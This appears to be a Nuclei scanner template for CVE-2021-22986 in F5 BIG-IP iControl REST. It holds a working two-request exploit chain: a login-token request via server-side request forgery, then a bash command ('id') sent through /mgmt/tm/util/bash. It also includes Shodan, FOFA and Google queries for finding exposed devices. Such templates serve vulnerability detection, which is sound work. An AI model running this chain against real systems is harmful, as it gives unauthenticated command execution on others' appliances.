http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - ([A-Z0-9]{26})
    type: regex
  - group: 1
    part: body
    regex:
    - '"commandResult":"(.*)"'
    type: regex
  matchers:
  - condition: and
    type: word
    words:
    - commandResult
    - uid=
  raw:
  - 'POST /mgmt/shared/authn/login HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Authorization: Basic YWRtaW46

    Content-Type: application/json

    Cookie: BIGIPAuthCookie=1234

    Connection: close


    {"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}

    '
  - 'POST /mgmt/tm/util/bash HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    X-F5-Auth-Token: {{token}}

    Content-Type: application/json

    Connection: close


    {"command":"run","utilCmdArgs":"-c id"}

    '
id: CVE-2021-22986
info:
  author: rootxharsh,iamnoooob
  classification:
    cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-22986
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-918
    epss-percentile: 0.99998
    epss-score: 0.94485
  description: F5 iControl REST interface is susceptible to remote command execution.
    An attacker can execute malware, obtain sensitive information, modify data, and/or
    gain full control over a compromised system without entering necessary credentials.
    This affects BIG-IP 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before
    14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3; and BIG-IQ 7.1.0.x
    before 7.1.0.3 and 7.0.0.x before 7.0.0.2.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the target system.

    '
  metadata:
    fofa-query: title="big-ip&reg;-+redirect" +"server"
    google-query: intitle:"big-ip&reg;-+redirect" +"server"
    max-request: 2
    product: big-ip_access_policy_manager
    shodan-query: http.title:"big-ip&reg;-+redirect" +"server"
    vendor: f5
  name: F5 iControl REST - Remote Command Execution
  reference:
  - https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
  - https://support.f5.com/csp/article/K03009991
  - http://packetstormsecurity.com/files/162059/F5-iControl-Server-Side-Request-Forgery-Remote-Command-Execution.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22986
  - https://github.com/Miraitowa70/POC-Notes
  remediation: 'Apply the necessary security patches or updates provided by F5 Networks
    to mitigate the vulnerability.

    '
  severity: critical
  tags: cve,cve2021,bigip,rce,kev,packetstorm,f5,vkev,vuln
